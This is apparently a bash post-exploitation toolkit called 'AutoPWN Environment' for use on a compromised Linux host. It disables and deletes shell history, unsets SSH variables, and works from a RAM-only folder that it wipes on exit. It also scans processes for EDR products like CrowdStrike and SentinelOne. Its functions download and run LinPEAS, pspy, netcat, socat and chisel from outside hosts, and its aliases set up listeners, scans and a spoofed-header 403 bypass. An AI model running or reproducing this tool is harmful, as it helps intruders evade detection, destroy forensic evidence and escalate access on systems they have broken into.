#!/bin/bash
# ape.sh - AutoPWN Environment v1.7 - by Lutfifakee
# All functions and aliases are exported to new shell

set +o history 2>/dev/null
unset HISTFILE HISTSIZE SSH_CONNECTION SSH_CLIENT 2>/dev/null

# Color coding
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

BANNER="${RED}
        ___   ___  ____
       / _ | / _ \/ __/
      / __ |/ ___/ _/  
     /_/ |_/_/  /___/    
${GREEN}    AutoPWN Environment v1.7 - by Lutfifakee
${YELLOW}    \"Auto-cleanup - Type 'exit' to wipe traces\"${NC}
"

echo -e "$BANNER"

# Workspace di RAM
WORKSPACE="/dev/shm/.ape_$(whoami)_$$"
mkdir -p "$WORKSPACE" 2>/dev/null
cd "$WORKSPACE" 2>/dev/null
echo -e "${GREEN}[+] Workspace: $WORKSPACE (RAM only)${NC}"

# Auto cleanup function
auto_cleanup() {
    echo -e "\n${YELLOW}[!] Auto-cleaning all traces...${NC}"
    cd /tmp 2>/dev/null
    rm -rf "$WORKSPACE" 2>/dev/null
    rm -f /tmp/linpeas.sh /tmp/pspy 2>/dev/null
    unset HISTFILE HISTSIZE APE_ACTIVE
    history -c 2>/dev/null
    echo -e "${GREEN}[+] Workspace deleted. No evidence left.${NC}"
    echo -e "${PURPLE}Goodbye! 🐉${NC}"
}

# Deteksi environment
detect_environment() {
    echo -e "\n${BLUE}[*] Scanning Environment...${NC}"
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        echo -e "    OS: $PRETTY_NAME"
    else
        echo -e "    OS: $(uname -s) $(uname -r)"
    fi
    echo -e "    User: $(whoami) (UID: $(id -u))"
    if [ $(id -u) -eq 0 ]; then
        echo -e "    ${GREEN}[+] Running as ROOT - Full power mode${NC}"
    else
        echo -e "    ${YELLOW}[!] Not root - Limited capabilities${NC}"
    fi
    
    echo -e "\n${RED}[!] Security Software Detection:${NC}"
    for edr in "crowdstrike" "falcon" "sentinelone" "carbonblack" "cylance" "trendmicro" "mcafee" "symantec" "sophos" "splunk"; do
        if ps aux 2>/dev/null | grep -i "$edr" | grep -v grep > /dev/null 2>&1; then
            echo -e "    ${RED}[!] $edr detected${NC}"
        fi
    done
    [ -d "/opt/CrowdStrike" ] 2>/dev/null && echo -e "    ${RED}[!] CrowdStrike Falcon${NC}"
    [ -d "/opt/splunkforwarder" ] 2>/dev/null && echo -e "    ${RED}[!] Splunk Forwarder${NC}"
}

# Setup stealth
setup_stealth() {
    echo -e "\n${BLUE}[*] Applying stealth configurations...${NC}"
    unset HISTFILE HISTSIZE HISTFILESIZE 2>/dev/null
    export HISTSIZE=0 HISTFILESIZE=0 HISTFILE=/dev/null
    set +o history 2>/dev/null
    rm -f ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null
    unset SSH_CONNECTION SSH_CLIENT SSH_TTY 2>/dev/null
    echo -e "    ${GREEN}[+] History logging disabled${NC}"
}

# PTY Upgrade
pty_upgrade() {
    if [ ! -t 0 ]; then
        echo -e "\n${YELLOW}[!] Non-interactive shell detected. Upgrading...${NC}"
        python3 -c 'import pty; pty.spawn("/bin/bash")' 2>/dev/null || \
        script -qc /bin/bash /dev/null 2>/dev/null
    fi
}

# Download static binary
get_bin() {
    local bin_name="$1"
    if [ -z "$bin_name" ]; then
        echo -e "${RED}Usage: getbin <binary>${NC}"
        echo -e "${YELLOW}Available: nmap, ffuf, sqlmap, nc, socat, chisel${NC}"
        return 1
    fi
    
    local url=""
    case "$bin_name" in
        nmap) url="https://bin.pkgforge.dev/$(uname -m)/nmap" ;;
        ffuf) url="https://bin.pkgforge.dev/$(uname -m)/ffuf" ;;
        sqlmap) url="https://bin.pkgforge.dev/$(uname -m)/sqlmap" ;;
        nc) url="https://bin.pkgforge.dev/$(uname -m)/netcat" ;;
        socat) url="https://bin.pkgforge.dev/$(uname -m)/socat" ;;
        chisel) url="https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64" ;;
        *) echo -e "${RED}Unknown: $bin_name${NC}"; return 1 ;;
    esac
    
    local output="${WORKSPACE}/${bin_name}"
    echo -e "${BLUE}[*] Downloading ${bin_name}...${NC}"
    curl -sSLf -o "$output" "$url" 2>/dev/null
    if [ -f "$output" ]; then
        chmod +x "$output"
        export PATH="$WORKSPACE:$PATH"
        echo -e "${GREEN}[+] ${bin_name} ready! Type '${bin_name}'${NC}"
    else
        echo -e "${RED}[-] Download failed${NC}"
    fi
}

# Run LinPEAS
run_linpeas() {
    echo -e "${BLUE}[*] Downloading LinPEAS...${NC}"
    curl -sSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
    chmod +x /tmp/linpeas.sh 2>/dev/null
    echo -e "${GREEN}[*] Running LinPEAS (this may take a while)...${NC}"
    bash /tmp/linpeas.sh
    rm -f /tmp/linpeas.sh 2>/dev/null
}

# Run pspy
run_pspy() {
    echo -e "${BLUE}[*] Downloading pspy...${NC}"
    curl -sSL https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o /tmp/pspy 2>/dev/null
    chmod +x /tmp/pspy 2>/dev/null
    echo -e "${GREEN}[*] Running pspy (Ctrl+C to stop)...${NC}"
    /tmp/pspy
    rm -f /tmp/pspy 2>/dev/null
}

# Show help (FUNCTION, bukan alias)
show_help() {
    echo -e "\n${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${PURPLE}📖 APE Commands:${NC}"
    echo -e "  ${YELLOW}linpeas${NC}       - Privilege escalation checker"
    echo -e "  ${YELLOW}pspy${NC}          - Process monitor"
    echo -e "  ${YELLOW}getbin <name>${NC} - Download static binary"
    echo -e "  ${YELLOW}nclisten <port>${NC} - Netcat listener"
    echo -e "  ${YELLOW}fastscan <ip>${NC} - Quick port scan (needs nmap)"
    echo -e "  ${YELLOW}webscan <ip>${NC}  - Web service scan (needs nmap)"
    echo -e "  ${YELLOW}bypass403 <url>${NC} - Bypass 403 Forbidden"
    echo -e "  ${YELLOW}help${NC}          - Show this help"
    echo -e "  ${YELLOW}xhelp${NC}         - Same as help"
    echo -e "\n${GREEN}✨ Just type 'exit' - auto cleanup!${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
}

# Setup aliases & functions
setup_aliases() {
    echo -e "\n${BLUE}[*] Loading pentesting tools...${NC}"
    alias fastscan='nmap -T4 -F 2>/dev/null'
    alias webscan='nmap -sV -p 80,443,8080,8443 --script http-* 2>/dev/null'
    alias bypass403='curl -k -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1"'
    alias nclisten='nc -lvnp'
    alias getbin='get_bin'
    alias linpeas='run_linpeas'
    alias pspy='run_pspy'
    alias help='show_help'
    alias xhelp='show_help'
    echo -e "    ${GREEN}[+] Tools loaded${NC}"
}

# Main function
main() {
    detect_environment
    setup_stealth
    pty_upgrade
    setup_aliases
    
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${PURPLE}🎯 AutoPWN Environment ACTIVE (v1.7)${NC}"
    echo -e "${CYAN}📌 Type 'help' | Type 'exit' to wipe all traces${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
    
    # Custom prompt
    export PS1="\[\033[38;5;196m\]┌──\[\033[38;5;208m\](\[\033[38;5;82m\]🐉 AutoPWN\[\033[38;5;208m\])\[\033[38;5;196m\]─\[\033[38;5;208m\][\[\033[38;5;51m\]\u\[\033[38;5;208m\]@\[\033[38;5;51m\]\h\[\033[38;5;208m\]]\[\033[38;5;196m\]─\[\033[38;5;226m\](\[\033[38;5;82m\]\w\[\033[38;5;226m\])\n\[\033[38;5;196m\]└──\[\033[38;5;208m\](\[\033[38;5;82m\]\\$\[\033[38;5;208m\])\[\033[38;5;196m\]>\[\033[0m\] "
    
    # Export functions to child shell
    export -f get_bin
    export -f run_linpeas
    export -f run_pspy
    export -f show_help
    
    # Set trap for auto cleanup
    trap auto_cleanup EXIT
    
    # Start interactive shell (prevent recursive sourcing)
    if [ -z "$APE_ACTIVE" ]; then
        export APE_ACTIVE=1
        # Source bashrc then apply our aliases
        exec bash --rcfile <(cat ~/.bashrc 2>/dev/null; echo '
            export APE_ACTIVE=1
            export PS1="\[\033[38;5;196m\]┌──\[\033[38;5;208m\](\[\033[38;5;82m\]🐉 AutoPWN\[\033[38;5;208m\])\[\033[38;5;196m\]─\[\033[38;5;208m\][\[\033[38;5;51m\]\u\[\033[38;5;208m\]@\[\033[38;5;51m\]\h\[\033[38;5;208m\]]\[\033[38;5;196m\]─\[\033[38;5;226m\](\[\033[38;5;82m\]\w\[\033[38;5;226m\])\n\[\033[38;5;196m\]└──\[\033[38;5;208m\](\[\033[38;5;82m\]\\$\[\033[38;5;208m\])\[\033[38;5;196m\]>\[\033[0m\] "
            alias fastscan="nmap -T4 -F 2>/dev/null"
            alias webscan="nmap -sV -p 80,443,8080,8443 --script http-* 2>/dev/null"
            alias bypass403="curl -k -H \"X-Forwarded-For: 127.0.0.1\" -H \"X-Real-IP: 127.0.0.1\""
            alias nclisten="nc -lvnp"
            alias getbin="get_bin"
            alias linpeas="run_linpeas"
            alias pspy="run_pspy"
            alias help="show_help"
            alias xhelp="show_help"
        ')
    fi
}

# Run main
main
